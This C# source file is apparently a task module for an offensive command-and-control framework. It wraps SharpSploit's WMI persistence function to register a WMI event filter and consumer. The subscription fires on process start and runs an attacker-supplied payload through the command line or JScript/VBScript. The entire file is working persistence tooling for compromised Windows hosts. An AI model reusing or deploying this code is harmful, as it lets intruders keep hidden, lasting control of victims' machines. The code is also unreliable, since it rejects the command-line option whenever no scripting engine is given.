using System;
  
using SharpSploit.Persistence;

public static class Task
{
    public static string Execute(string eventName, string eventFilter, string eventConsumer, string payload, string processName = "", string scriptingEngine = "")
    {
        try
        {
            WMI.EventFilter EventFilter;
            WMI.EventConsumer EventConsumer;
            WMI.ScriptingEngine ScriptingEngine;

            if (eventFilter.ToLower() == "processstart") { EventFilter = WMI.EventFilter.ProcessStart; }
            else { return "WMI Persistence failed. Invalid Event Filter."; }

			if (eventConsumer.ToLower() == "commandline") { EventConsumer = WMI.EventConsumer.CommandLine; }
			else if (eventConsumer.ToLower() == "activescript") { EventConsumer = WMI.EventConsumer.ActiveScript; }
			else { return "WMI Persistence failed. Invalid Event Consumer."; }

			if (scriptingEngine.ToLower() == "jscript") { ScriptingEngine = WMI.ScriptingEngine.JScript; }
			else if (scriptingEngine.ToLower() == "vbscript") { ScriptingEngine = WMI.ScriptingEngine.VBScript; }
            else { return "WMI Persistence failed. Invalid Scripting Engine."; }

            if (WMI.InstallWMIPersistence(eventName, EventFilter, EventConsumer, payload, processName, ScriptingEngine))
                return "WMI Persistence suceeded for: " + eventName;
            return "WMI Persistence failed for: " + eventName;
        }
        catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
    }
}